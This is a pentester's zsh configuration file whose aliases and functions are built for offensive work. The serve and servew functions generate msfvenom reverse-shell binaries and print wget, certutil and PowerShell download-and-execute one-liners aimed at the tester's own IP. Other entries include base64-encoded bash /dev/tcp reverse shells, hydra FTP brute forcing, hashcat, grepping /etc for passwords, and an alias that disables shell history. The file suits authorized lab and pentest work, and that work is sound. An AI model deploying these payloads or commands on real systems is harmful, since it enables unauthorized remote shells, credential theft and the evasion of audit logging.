# Preferred 'ls' for detailed and sorted directory listing
alias ll='ls -lsaht --color=auto --group-directories-first'

# Quickly set environment variable e.g. "ee user henry"
function ee() { export $1="$2" }

# For ease of use
function get_myip() {
    export myip=$(ip addr show tun0 | grep -oP 'inet \K[\d.]+')
    echo -n $myip | xclip -selection clipboard
    export myip=$myip
}
get_myip # for tun0, now you can echo $myip

alias reload="source $HOME/.zshrc"

# Decode base64
decode64() {
    echo -n "$1" | base64 -d
}
alias de='decode64' # e.g. "de 23iho432io4"

# Grep through my notes
function gn() { grep -ri $1 ~/repos/offsec/$2 }

# Colored and context-aware grep with PCRE support
alias grep='grep --color=auto -P'

function ee() { export $1="$2" } 
function en() { echo -n "$1" | $@ } # 
function cn() { cat $1 | grep -i $@ }
function ec() { echo -n "$1" | wc -c }
function cl() { cat $1 | wc -l }
function pc() { python -c "$@" }

alias so="sgpt --role kali --model gpt-4-turbo --no-md"

function ftpbrute() { hydra -C /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $1 ftp }

# Repetitive gobuster script, url as argument
function dbd() { gobuster dir -u "$1" -w /opt/SecLists/Discovery/Web-Content/megadir.txt -k -t 15 --exclude-length 0 }

function dbf() { gobuster dir -u "$1" -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -k -t 15 --exclude-length 0 }

function dbdl() { gobuster dir -u "$1" -w /opt/SecLists/Discovery/Web-Content/megadirlow.txt -k -t 15 --exclude-length 0 }

function dbfl() { gobuster dir -u "$1" -w /opt/SecLists/Discovery/Web-Content/raft-large-files-lowercase.txt -k -t 15 --exclude-length 0 }

# Something more reliable than gobuster
function wfd() { wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_directories.txt --hc 404 $@ }

function wff() { wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 $@ }

function wffl() { wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files-lowercase.txt --hc 404 $@ }

export smbAddress="\\\\\\${myip}\\share"
alias smbserver='echo -ne "\033]0;SMBserv\007"; echo "net use x: $smbAddress /user:sender password"; impacket-smbserver share . -username sender -password password -smb2support'

# Repetitive hashcat command
function hc() { hashcat $1 /usr/share/wordlists/combo.txt $@ -O}

function serve() {
    if [[ $# -eq 0 ]]; then
        echo "wget http://$myip:8000/pspy64 -O /dev/shm/pspy; wget http://$myip:8000/linpeas.sh -O /dev/shm/linpeas.sh; wget http://$myip:8000/su-checker.sh -O /dev/shm/su-checker.sh; wget http://$myip:8000/flare.sh -O /dev/shm/flare.sh; chmod +x /dev/shm/*;"
        python -m http.server;
    elif [[ $# -eq 1 ]]; then
        echo "wget http://$myip:$1/pspy64 -O /dev/shm/pspy; wget http://$myip:$1/linpeas.sh -O /dev/shm/linpeas.sh; wget http://$myip:$1/su-checker.sh -O /dev/shm/su-checker.sh; wget http://$myip:$1/flare.sh -O /dev/shm/flare.sh; chmod +x /dev/shm/*;"
        python -m http.server $1
    elif [[ $# -eq 2 ]]; then
        echo "wget http://$myip:$1/pspy64 -O /dev/shm/pspy; wget http://$myip:$1/linpeas.sh -O /dev/shm/linpeas.sh; wget http://$myip:$1/shell$2 -O /dev/shm/shell$2; wget http://$myip:$1/su-checker.sh -O /dev/shm/su-checker.sh; wget http://$myip:$1/flare.sh -O /dev/shm/flare.sh; chmod +x /dev/shm/*;"
        msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=$myip LPORT=$2 -o shell$2
        python -m http.server $1
    fi
}

function servew() {
    if [[ $# -eq 0 ]]; then
        echo "cd c:\\windows\\\tasks\\ && powershell -ep bypass && iex(iwr -uri $myip:8000/transfer_files.ps1 -usebasicparsing)"
        python -m http.server;
    elif [[ $# -eq 1 ]]; then
        echo "cd c:\\windows\\\tasks\\ && powershell -ep bypass && iex(iwr -uri $myip:$1/transfer_files.ps1 -usebasicparsing)"
        python -m http.server $1
    elif [[ $# -eq 2 ]]; then
        echo "cd c:\\windows\\\tasks\\ && powershell -ep bypass && iex(iwr -uri $myip:$1/transfer_files.ps1 -usebasicparsing) && certutil.exe -f -urlcache -split http://$myip:$1/shell$2.exe shell$2.exe && curl $myip:$1/shell$2.exe -o c:\windows\tasks\shell$2.exe"
        msfvenom -p windows/shell_reverse_tcp -f exe LHOST=$myip LPORT=$2 -o shell$2.exe
        python -m http.server $1
    fi
}

export WINEARCH=win32
export WINEPREFIX=$HOME/.wine/drive_c/windows/system32/

# Enhanced network enumeration and exploitation
alias listen='ip a | grep tun0; sudo rlwrap -cAz nc -lvnp'
alias scan='sudo rustscan -t 3000 --tries 2 -b 2048 -u 16384 -a'
alias nmap-scan='sudo nmap -sC -sV -oN nmap_scan.txt'
alias nikto='nikto -host'

# For no spaces in the encoded reverse shell
function br() { 
    echo -n "bash -i  >& /dev/tcp/$myip/$1 0>&1  " | base64 ;
    echo -n "bash -i  >& /dev/tcp/$myip/$1  0>&1" | base64 ;
}

# Clean Rustscan output for better readability
alias clean='sed -e '\''s/\x1b\[[0-9;]*m//g'\'''
# Example: clean initial > rustscan_cleaned.txt

# Extraction and cleaning of nmap results
alias nmap-summary="grep 'open\|filtered\|closed' nmap_scan.txt | awk '{print \$1,\$2}'"

# Reverse shell snippets ready for deployment
alias revshells='cat /opt/tools/reverse-shells.txt | grep'

# Quick checks for open ports using netstat
alias checkports='sudo netstat -tuln'

# Quick privilege escalation enumeration with LinPEAS and WinPEAS
alias linpeas='curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'
alias winpeas='curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -o winpeas.exe && wine winpeas.exe'

# Extraction based on file type
function extract() {
    if [ -f $1 ]; then
        case $1 in
            *.tar.bz2) tar xjf $1 ;;
            *.tar.gz) tar xzf $1 ;;
            *.bz2) bunzip2 $1 ;;
            *.rar) unrar x $1 ;;
            *.gz) gunzip $1 ;;
            *.tar) tar xf $1 ;;
            *.tbz2) tar xjf $1 ;;
            *.tgz) tar xzf $1 ;;
            *.zip) unzip $1 ;;
            *.Z) uncompress $1 ;;
            *.7z) 7z x $1 ;;
            *) echo "'$1' cannot be extracted via extract()" ;;
        esac
    else
        echo "'$1' is not a valid file"
    fi
}

# History configurations
HISTFILE=~/.zsh_history
HISTSIZE=100000
SAVEHIST=2000000
HISTCONTROL=ignoredups:erasedups
setopt histappend
PROMPT_COMMAND="${PROMPT_COMMAND:+$PROMPT_COMMAND$'\n'}history -a; history -c; history -r"
setopt hist_expire_dups_first # delete duplicates first when HISTFILE size exceeds HISTSIZE
setopt hist_ignore_dups       # ignore duplicated commands history list
setopt hist_ignore_space      # ignore commands that start with space
setopt hist_verify            # show command with history expansion to user before running it
setopt share_history         # share command history data

# Customized tmux session for pentesting
alias tmuxpen='tmux new-session -s pentest \; split-window -v \; split-window -h \; attach'
alias tmuxrestore='tmux attach-session -t pentest || tmuxpen'

# Customized tmux session for pentesting with multiple windows
alias tmuxpen='tmux new -s pentest \; split-window -h \; split-window -v \; attach'
alias tmuxrestore='tmux attach-session -t pentest || tmuxpen'

# Networking shortcuts for quick testing
alias pingtest='ping -c 4'
alias realip='curl ifconfig.me'

# Quick enumeration of running processes and logins
alias psaux='ps auxww | grep'
alias findlogins='grep -r -i "password\|user" /etc/* 2>/dev/null'

# Reverse engineering with GDB and pwntools
alias gef='gdb -q -ex init gef'
alias pwn='pwn toolkit setup'

# Secure deletion of files
alias srm='shred -u -z -v'
alias sfill='sudo sfill -v -z'

# Disable command history temporarily
alias noh='export HISTFILE=/dev/null'

# Environment setup and security tool updates
alias toolsetup='cd ~/tools && sudo git pull && ./install.sh && cd -'

# Automation for auditing file permissions and security checks
function checkperms() {
    echo "[+] Checking for world-writable directories..."
    find / -type d -perm -002 2>/dev/null | tee world_writable_dirs.txt
    echo "[+] Checking for world-writable files..."
    find / -type f -perm -002 2>/dev/null | tee world_writable_files.txt
}

# Docker management for quick container operations
alias dclean='docker system prune -a'
alias drun='docker run -it --rm'
alias dlist='docker ps -a'
alias dexec='docker exec -it'

# Automation for script management and execution
alias scriptlist='ls -1 ~/scripts/'
alias scriptedit='vim ~/scripts/'

# Enable strict mode for Bash scripts for safer scripting
set -euo pipefail
IFS=$'\n\t'


# Setup environment for binary exploitation
function binexp() {
    mkdir -p ~/bin_exploits/$1
    cd ~/bin_exploits/$1
    tmux new-session -d -s binexploits
    tmux send-keys "gef -q $1" C-m
    tmux split-window -h
    tmux send-keys "pwntools setup" C-m
    tmux split-window -v
    tmux send-keys "readelf -a $1 > readelf_$1.txt" C-m
    tmux attach-session -t binexploits
}

